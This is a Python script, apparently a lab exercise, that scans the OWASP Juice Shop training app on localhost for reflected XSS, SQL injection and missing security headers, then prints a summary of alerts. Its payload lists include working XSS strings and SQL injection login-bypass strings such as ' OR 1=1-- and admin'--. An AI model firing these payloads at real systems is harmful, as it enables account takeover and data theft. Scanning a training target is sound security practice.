import requests

# ── Configuration 
BASE_URL = "http://localhost:3000"

# Endpoints where user input gets reflected or processed
XSS_TARGETS = [
    ("GET",  "/rest/products/search", "q"),      # search query reflected
    ("GET",  "/redirect",             "to"),      # open-redirect / reflection
]

SQLI_TARGETS = [
    ("POST", "/rest/user/login", None),           # login form
    ("GET",  "/rest/products/search", "q"),       # search query
]

# ── Payload Lists 
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<u>test</u>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert('xss')</script>",
]

SQLI_PAYLOADS = [
    "'",
    "--",
    "') OR 1=1--",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL--",
]

SECURITY_HEADERS = [
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-Content-Type-Options",
]

# Database error strings that hint at SQL injection
DB_ERROR_STRINGS = [
    "SQLITE_ERROR",
    "SQL syntax",
    "sqlite",
    "unrecognized token",
    "near \"",
]

# ── Alert Tracking (avoid duplicates – Part 6)
alerts_seen = set()
vulnerability_summary = []  # list of dicts


def add_alert(category, endpoint, payload, detail):
    """Record a unique alert. Skip duplicates."""
    key = (category, endpoint, payload)
    if key in alerts_seen:
        return
    alerts_seen.add(key)

    entry = {
        "category": category,
        "endpoint": endpoint,
        "payload":  payload,
        "detail":   detail,
    }
    vulnerability_summary.append(entry)
    print(f"  [ALERT] {category:10s} | {endpoint:40s} | Payload: {payload}")
    print(f"          Detail: {detail}")


# ── Helper 
def send_request(method, path, param_key, payload):
    """Fire a request and return the response object (or None)."""
    url = f"{BASE_URL}{path}"
    try:
        if method == "GET":
            params = {param_key: payload} if param_key else None
            return requests.get(url, params=params, timeout=10)
        else:
            body = {"email": payload, "password": payload}
            return requests.post(url, json=body, timeout=10)
    except requests.RequestException as e:
        print(f"  [!] Connection error: {e}")
        return None


# ── Part 3 – XSS Detection
def detect_xss():
    print("=" * 100)
    print("PART 3 – XSS Vulnerability Detection")
    print("=" * 100)

    for method, path, param in XSS_TARGETS:
        for payload in XSS_PAYLOADS:
            resp = send_request(method, path, param, payload)
            if resp is None:
                continue

            # Check if the payload is reflected unescaped in the response
            if payload in resp.text:
                add_alert(
                    "XSS",
                    f"{method} {path}",
                    payload,
                    "Payload reflected unchanged → possible Reflected XSS"
                )
            # Also check for the raw <script> tag presence
            elif "<script>" in payload and "<script>" in resp.text:
                add_alert(
                    "XSS",
                    f"{method} {path}",
                    payload,
                    "<script> tag found in response body"
                )
    print()


# ── Part 4 – SQL Injection Detection 
def detect_sqli():
    print("=" * 100)
    print("PART 4 – SQL Injection Detection")
    print("=" * 100)

    for method, path, param in SQLI_TARGETS:
        for payload in SQLI_PAYLOADS:
            resp = send_request(method, path, param, payload)
            if resp is None:
                continue

            # Flag HTTP 500 responses
            if resp.status_code == 500:
                add_alert(
                    "SQLi",
                    f"{method} {path}",
                    payload,
                    f"HTTP 500 Internal Server Error – likely SQL syntax issue"
                )
                continue

            # Search for database error strings in the response body
            body_lower = resp.text.lower()
            for err in DB_ERROR_STRINGS:
                if err.lower() in body_lower:
                    add_alert(
                        "SQLi",
                        f"{method} {path}",
                        payload,
                        f"DB error string detected: '{err}'"
                    )
                    break

            # Check if login was bypassed (token in response)
            if "token" in resp.text and resp.status_code == 200:
                add_alert(
                    "SQLi",
                    f"{method} {path}",
                    payload,
                    "Authentication bypass – received auth token"
                )
    print()


# ── Part 5 – Security Header Check 
def check_security_headers():
    print("=" * 100)
    print("PART 5 – Security Header Analysis")
    print("=" * 100)

    try:
        resp = requests.get(BASE_URL, timeout=10)
    except requests.RequestException as e:
        print(f"  [!] Could not reach {BASE_URL}: {e}")
        return

    for header in SECURITY_HEADERS:
        if not resp.headers.get(header):
            add_alert(
                "CONFIG",
                BASE_URL,
                "N/A",
                f"Missing header: {header} – Low Severity"
            )
    print()


# ── Part 6 – Vulnerability Summary 
def print_summary():
    print("=" * 100)
    print("PART 6 – Vulnerability Summary")
    print("=" * 100)

    if not vulnerability_summary:
        print("  No vulnerabilities detected.")
        return

    # Count by category
    counts = {}
    for v in vulnerability_summary:
        counts[v["category"]] = counts.get(v["category"], 0) + 1

    print(f"\n  Total unique alerts: {len(vulnerability_summary)}")
    for cat, count in counts.items():
        print(f"    {cat:10s}: {count}")

    print(f"\n  {'#':<4} {'Category':<10} {'Endpoint':<42} {'Detail'}")
    print("  " + "-" * 96)
    for i, v in enumerate(vulnerability_summary, 1):
        print(f"  {i:<4} {v['category']:<10} {v['endpoint']:<42} {v['detail']}")

    print()


# ── Main 
if __name__ == "__main__":
    print(f"\n  Point-in-Time Vulnerability Assessment")
    print(f"  Target: OWASP Juice Shop @ {BASE_URL}\n")

    detect_xss()
    detect_sqli()
    check_security_headers()
    print_summary()

    print("=" * 100)
    print("Scan complete.")
